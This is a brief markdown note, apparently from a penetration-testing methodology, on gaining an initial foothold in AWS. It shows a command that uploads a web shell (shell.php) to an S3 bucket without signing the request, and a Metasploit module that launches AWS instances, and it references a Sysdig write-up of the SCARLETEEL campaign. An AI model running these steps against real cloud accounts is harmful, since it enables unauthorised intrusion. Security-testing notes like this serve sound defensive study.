# 03 - Initial Foothold

```
$ aws s3 --no-sign-request cp shell.php s3://<s3_bucket_IP>
```

```
msf > use auxiliary/admin/aws/aws_launch_instances
```

---
## References

https://docs.aws.amazon.com/cli/latest/reference/s3/cp.html

https://sysdig.com/blog/scarleteel-2-0/